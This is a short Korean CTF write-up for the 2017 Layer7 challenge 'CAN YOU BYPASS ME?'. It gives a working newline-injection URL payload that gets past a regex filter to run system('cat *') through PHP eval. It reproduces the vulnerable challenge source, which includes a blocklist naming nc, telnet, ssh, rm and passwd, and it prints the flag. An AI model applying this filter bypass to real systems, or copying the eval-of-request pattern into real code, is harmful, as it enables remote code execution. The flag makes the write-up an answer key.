# [2017 Layer7 CTF] CAN YOU BYPASS ME? - Writeup

## Sandbox Jail

정규표현식에서 `s` 플래그가 없으면 `.`이 개행문자(`\n`)를 포함하지 않는다는 점을 이용한 필터링 우회 문제다.

`.php`를 필터링하는건 와일드카드를 이용하여 우회해주자.

[http://ctf.layer7.kr:6001/?eval=system%28%0a%22%0acat+*%22%0a%29%3B](http://ctf.layer7.kr:6001/?eval=system%28%0a%22%0acat+*%22%0a%29%3B)

```
<?php
# config.php
error_reporting(0);

function php_info(){
    exit('PHP Version 7.0.18-0ubuntu0.16.10.1');
}

$filter = "/\||\/|\.\.|config|fwrite|fputs|shutdown|halt|".
"reboot|init|rm|mv|cp|remove|rename|copy|grep|nc|unlink|find|".
"apt|yum|passwd|chmod|chown|ln|kill|lilo|ssh|telnet/i";

$implode = implode($_REQUEST);

if(preg_match($filter, $implode)){
	exit('403 forbidden');
}
?>
<?php
# flag is {flagflagflagflagfalgflagaflaglafg}
?>
<?php
# made by munsiwoo
error_reporting(0);
include 'config.php';

if(isset($_GET['phpinfo'])){
	php_info();
}

if(isset($_GET['eval'])){
    $filter = '/_|(.*)(\'|\"|\`|\()(.*)(\'|\"|\`|\))|(.php|\=|\$)/i';
    if(preg_match($filter, $_GET['eval'])){
		exit('nope');
    }
    # 403 forbidden : system filter
    eval($_GET['eval']);
}

echo '<hr>';
highlight_file(__FILE__);
```

___

## Answer

flag: `flagflagflagflagfalgflagaflaglafg`